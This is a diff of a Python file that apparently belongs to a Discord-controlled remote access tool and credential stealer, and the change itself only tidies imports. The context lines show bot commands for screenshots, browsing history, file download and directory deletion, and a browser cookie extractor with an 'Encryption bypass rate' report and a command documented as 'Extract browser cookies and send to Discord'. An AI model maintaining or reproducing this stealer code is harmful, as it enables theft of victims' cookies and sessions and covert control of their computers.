@@ -1,61 +1,43 @@
-import logging
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-try:
-    import win32crypt
-except ImportError:
-    logger.warning("win32crypt not available. Browser data extraction may not work properly.")
 import asyncio
-import discord
-from discord.ext import commands
-from discord import File
-import pyautogui
-import socket
-import subprocess
-import pyperclip
-import os
-import time
-import ctypes
-import webbrowser
-import keyboard
-import threading
-from threading import Thread, Event
-import json
-from datetime import datetime, timedelta, timezone
-import sqlite3
-import shutil
-import sys
-from os import getenv
-import glob
-import ssl
-import certifi
-import aiohttp
 import base64
-import pyaes
-import random
-import re
-import traceback
-import zlib
-import winreg
-import requests
-import tempfile
-import urllib3
-from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
-from discord import TextChannel, Embed, Color, File
+import ctypes
+import glob
 import io
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import json
+import logging
+import os
 import platform
-import zipfile
+import re
+import shutil
+import socket
+import sqlite3
+import ssl
+import subprocess
+import sys
+import tempfile
+from threading import Thread, Event
+import time
 import urllib.request
+import winreg
+import zipfile
+from datetime import datetime, timedelta, timezone
+from os import getenv
+from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
+import aiohttp
+import certifi
 import cv2
+import discord
+import keyboard
 import numpy as np
+import pyautogui
+import pyperclip
+import requests
+import urllib3
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from discord import Embed, File, TextChannel, Color
+from discord.ext import commands
 from flask import Flask, render_template_string, Response
-import threading
 from PIL import Image, ImageGrab
-import io
-
-
 
 disable_warnings_urllib3()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -824,7 +806,7 @@ async def recent(ctx, browser: str = "chrome"):
             f"An error occurred while collecting browsing history: {e}{watermark()}"
         )
 
-from discord import File
+
 
 @bot.command()
 async def screen(ctx):
@@ -1145,8 +1127,6 @@ async def rmd(ctx, *, dirname: str):
     except Exception as e:
         await ctx.send(f"Error deleting directory: {e}{watermark()}")
 
-from discord import File
-
 @bot.command()
 async def download(ctx, *, filename: str):
     try:
@@ -1302,7 +1282,6 @@ async def ram(ctx):
         )
     except Exception as e:
         await ctx.send(f"Error getting RAM info: {e}{watermark()}")
-from discord import File
 class AdvancedBrowserCookieExtractor:
     def __init__(self):
         self.system = platform.system()
@@ -1725,7 +1704,6 @@ Encryption bypass rate: {(decrypted_count/len(cookies)*100):.1f}%
 
     extractor = None
 extractor = None
-from discord import File
 @bot.command(name='browsers')
 async def extract_browsers_command(ctx):
     """Extract browser cookies and send to Discord"""
